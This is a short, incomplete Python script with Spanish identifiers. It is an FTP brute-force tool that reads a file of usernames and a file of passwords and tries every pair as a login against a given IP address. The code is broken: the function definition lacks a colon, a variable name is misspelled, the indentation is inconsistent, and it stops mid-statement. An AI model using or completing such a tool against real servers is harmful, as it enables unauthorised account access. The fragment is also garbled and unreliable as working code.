import ftplib
import sys

def acceder (ip, usuarios , claves)
    try:
          ud = open (usuarios, "r")
          pd = open(claves, "r")

          users = ud.readlines()
          passwords = pd.readlines()

          for user in users:
                for pasword in passwords:
                      try:
                            print ("Conectando...")
                            connect = ftplib.FTP(ip)
                            respuesta = connect.login(user, password)
                             if respuesta 